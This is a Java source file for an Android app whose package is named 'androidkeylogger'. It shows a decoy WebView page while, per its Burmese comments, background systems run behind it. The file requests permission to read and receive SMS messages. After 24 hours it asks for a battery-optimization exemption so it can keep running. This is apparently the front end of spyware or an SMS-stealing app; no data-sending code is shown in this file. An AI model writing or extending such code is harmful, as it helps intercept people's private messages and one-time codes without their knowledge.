package com.bshu2.androidkeylogger;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.webkit.WebView;
import android.webkit.WebSettings;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int SMS_PERMISSION_CODE = 100;
    private static final String PREF_NAME = "AppPrefs";
    private static final String KEY_INSTALL_TIME = "InstallTime";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // WebView ကို အသုံးပြုပြီး index.html မျက်နှာပြင်ကို ပြသခြင်း
        WebView webView = new WebView(this);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webView.loadUrl("file:///android_asset/index.html");
        setContentView(webView);

        // နောက်ကွယ်မှ အလုပ်လုပ်မည့် စနစ်များနှင့် ခွင့်ပြုချက်စစ်ဆေးခြင်းများ
        requestSmsPermissions();
        checkInstallationTimeAndBattery();
    }

    private void requestSmsPermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            
            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS
            }, SMS_PERMISSION_CODE);
        }
    }

    private void checkInstallationTimeAndBattery() {
        SharedPreferences prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        long installTime = prefs.getLong(KEY_INSTALL_TIME, 0);

        if (installTime == 0) {
            installTime = System.currentTimeMillis();
            prefs.edit().putLong(KEY_INSTALL_TIME, installTime).apply();
        } else {
            long currentTime = System.currentTimeMillis();
            long hoursElapsed = (currentTime - installTime) / (1000 * 60 * 60);

            if (hoursElapsed >= 24) {
                requestBatteryOptimizationExemption();
            }
        }
    }

    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + packageName));
                    startActivity(intent);
                } catch (Exception e) {
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            }
        }
    }
}